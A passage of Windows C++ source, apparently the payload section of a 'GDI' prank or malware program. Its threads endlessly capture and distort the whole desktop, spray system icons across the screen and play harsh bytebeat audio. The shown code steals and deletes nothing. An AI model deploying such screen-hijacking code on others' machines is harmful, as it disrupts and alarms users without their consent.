    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (int t = 1;; t++) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            rgbquad[i].rgb += RGB(x | y, x * y, x + y) / t;
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader16_NoName16(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            int tmp = (rgbquad[i].r + rgbquad[i].g + rgbquad[i].b) / 2;
            rgbquad[i].rgb += RGB(tmp, tmp, tmp) + i;
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCAND);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader17_NoName17(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            int tmp = (rgbquad[i].r + rgbquad[i].g + rgbquad[i].b) * 3;
            rgbquad[i].rgb += RGB(tmp, tmp, tmp) - i + x;
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCERASE);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader18_NoName18(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            int tmp = (rgbquad[i].r + rgbquad[i].g) / 2;
            rgbquad[i].rgb += RGB(tmp, tmp, i);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCINVERT);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader19_NoName19(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            rgbquad[i].rgb += x - rand() % 100 * y;
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader20_NoName20(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            rgbquad[i].rgb += RGB(x + y, Hue(255), y + rand() % 100);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader21_NoName21(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            rgbquad[i].rgb = i + x | (x + y);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCERASE);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader22_NoName22(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (int t = 1;; t++) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            rgbquad[i].rgb ^= (x ^ y) * t;
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCAND);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader23_NoName23(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            rgbquad[i].rgb *= x * 7 | y * 8;
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCAND | NOTSRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader24_NoName24(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            rgbquad[i].rgb += i >> 2 * x | y;
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader25_NoName25(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            int tmp = (rgbquad[i].r + rgbquad[i].g + rgbquad[i].b) / 3;
            rgbquad[i].rgb += RGB(i, x, y) - RGB(x, i, y) + RGB(tmp, tmp, tmp);
        }
        BitBlt(hdc, rand() % 10 - 5, rand() % 10 - 5, w, h, hcdc, 0, 0, NOTSRCERASE);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader26_NoName26(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (int t = 0;; t += 30) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            int tmp = (rgbquad[i].r + rgbquad[i].b) / 2;
            rgbquad[i].rgb = RGB(tmp, tmp, x + t);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader27_NoName27(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (int t = 0;; t += 30) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            if (x < w / 2)rgbquad[i].r = rgbquad[i].g;
            else rgbquad[i].g = rgbquad[i].b;
            if (y < h / 2) rgbquad[i].b = rgbquad[i].g;
            else rgbquad[i].g = rgbquad[i].r;
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader28_NoName28(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (int t = 0;; t += 30) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            rgbquad[i].rgb += (x - y) * (y - x);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Payload5_Icon4(LPVOID lpParam) {
    int radius = 32, count = 0; double chushi = 1;
    HICON tubiaoshuliang = ExtractIconA(0, "shell32.dll", -1);
    int nums = (int)tubiaoshuliang;
    srand(time(NULL));
    while (true) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        int numCircles = (h / (radius + 4.5)) * radius;
        for (int i = 0; i < numCircles; i++) {
            int spiralRadius = i * chushi, x = ((w / 2) + radius) + spiralRadius * cos(i * 1.2), y = ((h / 2) + radius) + spiralRadius * sin(i * 1.2);
            HICON hIcon = ExtractIconA(0, "shell32.dll", rand() % nums);
            DrawIcon(hdc, x, y, hIcon);
            DestroyIcon(hIcon);
            if (count == 10) { count = 0; Sleep(20); }
            else { count++; }
        }
        if (chushi > 2.5) { chushi = 1; }
        else { chushi = chushi + 0.1; }
        ReleaseDC(0, hdc);
        Sleep(500);
    }
}
DWORD WINAPI Shader29_Last(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (int t = 0;; t += 30) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            rgbquad[i].rgb += x * y;
        }
        HBRUSH hbrush = CreateSolidBrush(RndRGB);
        HBITMAP hbmp = (HBITMAP)SelectObject(hcdc, hbrush);
        PatBlt(hcdc, 0, 0, w, h, PATINVERT);
        BitBlt(hdc, rand() % (2 * w) - w, rand() % (2 * h) - h, w, h, hcdc, 0, 0, SRCINVERT);
        SelectObject(hcdc, hbmp);
        DeleteObject(hbrush);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 13 | (t >> 1 * t >> 10 ^ t >> 2) & t >> 8) * 114514 & t >> 5);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * ("N91Bro1314"[t >> 10 & 7] >> 2) | ~t >> 8) + 2);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * ("65536"[3 & t >> 10] & 15 & t >> 2));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(10 * (t >> 8 & t | t >> (t >> 10)) + (t >> 8 & 5));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t & (t >> 7 | t >> 8 | t >> 16) >> (t >> 16 & t) ^ t) * t | t << t * rand());
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (4 | t >> 13 & 3) >> (~t >> 11 & 1) & 128 | t * (t >> 11 & t >> 13) & 128);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t << t << (t >> 5 | t >> 8 & t) | t);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound8() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t + (t & t ^ t >> 6) - t * (t % 16 ? 6 : 2));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound9() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t & t >> 8) + (t ^ t >> 5) & (t | t >> 4)));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound10() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * t * (t >> 9));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound11() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t + t >> 8) & (t + t >> 5) | (t & t << 4) + (t & t >> 7)) + rand() % 48);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound12() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t % 250 | t * 4 & t >> 8 | t * 3 & t >> 10);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound13() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(10 * (t >> 7 | t | t >> 6) + 4 * (t & t >> 13));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound14() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * 4 | t | ((t >> 9 & t >> 3) >> (t >> 17)) * t);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound15() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * (t >> 8 | t >> 9) & 42 & 30 & t >> 8) * 255 | t * rand());
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound16() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * (t >> 13 | (t >> 1 * t >> 10 ^ t >> 2) & t >> 8) * 114514 & t >> 5) - 1);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound17() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t / (double)(t >> 7 | t >> 12)));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound18() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(430 * (t * 5 >> 5 | t * 5 >> 15) | t);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
